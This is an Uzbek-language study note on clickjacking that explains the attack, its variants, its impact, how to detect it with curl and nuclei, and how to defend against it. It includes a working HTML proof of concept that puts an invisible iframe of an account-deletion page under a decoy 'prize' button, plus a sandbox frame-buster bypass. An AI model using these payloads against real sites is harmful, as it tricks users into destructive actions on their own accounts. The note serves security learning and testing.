# Clickjacking (UI Redressing)

> Lab yechimlari (PortSwigger'ning 5 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Target saytni `<iframe>` ichiga solib, uni **ko'rinmas** (opacity ~0) qilasan va ustiga o'zingning
aldamchi sahifangni qo'yasan. Qurbon sening "Sovrin yut" tugmangni bosaman deb o'ylaydi, lekin
sichqoncha aslida **ko'rinmas iframe ichidagi target saytning real tugmasini** (masalan "Akkauntni
o'chir") bosadi. Qurbon login bo'lgani uchun amal uning huquqi bilan bajariladi.

**Ildiz sabab:** sayt o'zini begona domen iframe'iga solishga ruxsat beradi (framing himoyasi yo'q:
`X-Frame-Options` yoki CSP `frame-ancestors` qo'yilmagan). CSRF'dan farqi — bu yerda qurbonning
**haqiqiy kliki** ishlatiladi, shuning uchun CSRF token ham himoya qilmaydi (token iframe ichida
avtomat yuboriladi).

## Qanday ishlaydi
```
1. Attacker sahifasi: ko'rinmas iframe(target) + ustida ko'rinadigan aldamchi tugma.
2. Qurbon aldamchi tugmani bosadi.
3. Klik ko'rinmas iframe'ga o'tadi → target saytdagi real tugma bosiladi (qurbon sessiyasi bilan).
```

## Turlari / variantlar
- **Oddiy (bitta klik)** — bitta tugmani bostirish (o'chirish, tasdiq).
- **Multistep** — bir necha klik (masalan "O'chir" → "Ha, tasdiqla") → bir necha aldamchi qatlam.
- **Prefilled form + clickjacking** — forma URL paramdan to'ldiriladi, faqat "Submit" bostiriladi.
- **Clickjacking → DOM XSS** — iframe src'ga XSS payload qo'yib, klik bilan XSS'ni ishga tushirasan.
- **Drag-and-drop / cursorjacking** — kam uchraydigan ilg'or variantlar.

## Oqibatlar (IMPACT) — nega bu muhim
- Bitta klik bilan sozlama o'zgartirish (email/parol — agar bitta bosishda bajarilsa) → ATO sari.
- OAuth "Ruxsat beraman" tugmasini bostirish → akkauntni attacker'ga bog'lash.
- Pul o'tkazish/buyurtma tasdig'i, obuna, like/follow (ijtimoiy manipulyatsiya).
- Chain: clickjacking → DOM XSS → to'liq ATO.
> O'zi odatda **Low/Medium**. Sensitive harakat yoki XSS chain bo'lsa ko'tariladi. Ko'p dasturlar
> faqat "sensitive action framed bo'lsa" qabul qiladi — shuni isbotla.

## Aniqlash
Himoya **yo'q** bo'lsa — zaif:
```bash
curl -sI https://target.com | grep -iE "x-frame-options|frame-ancestors"
```
> `X-Frame-Options` yoki `frame-ancestors` qaytmasa — iframe'ga solsa bo'ladi.

## Exploit PoC
```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:700px; opacity:0.0001; z-index:2; }
  .decoy { position:absolute; top:300px; left:60px; z-index:1; font-size:30px; }
</style>
<div class="decoy">BU YERGA BOS — SOVRIN YUTASAN</div>
<iframe src="https://target.com/account/delete"></iframe>
```
> `opacity` bilan iframe ko'rinmas, lekin bosiladi. Tugmani real tugma ustiga aniq joylaysan.

## Frame-buster bypass (sayt JS bilan himoyalansa)
```html
<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
```
> `sandbox`'da `allow-top-navigation` bermasang, saytning `top.location` himoyasi ishlamaydi.

## TOOLLAR

### Burp Clickbandit — PoC yasagich
```
Burp → Clickbandit → target sahifani yuklab, klik ketma-ketligini yozib olasan
```
> Brauzerda o'zing bosib ko'rsatasan, Burp tayyor HTML PoC generatsiya qiladi.

### nuclei — header tekshiruvi ommaviy
```bash
nuclei -l live_hosts.txt -t ~/nuclei-templates/http/misconfiguration/ -tags clickjack
```
> Ko'p hostda `X-Frame-Options`/`frame-ancestors` yo'qligini bir yo'la topadi.

### curl — qo'lda tez tekshiruv
```bash
for u in $(cat live_hosts.txt); do echo "$u: $(curl -sI $u | grep -i x-frame-options || echo YO'Q)"; done
```
> Ro'yxatdagi har hostda himoya bor-yo'qligini bitta qatorda ko'rsatadi.

## PoC
HTML faylni och, ustiga soxta UI qo'yib, real tugma bosilishini video qil.

## Himoya
`X-Frame-Options: DENY` yoki `CSP: frame-ancestors 'none'`, sensitive harakatga
qo'shimcha tasdiq (parol/CAPTCHA).
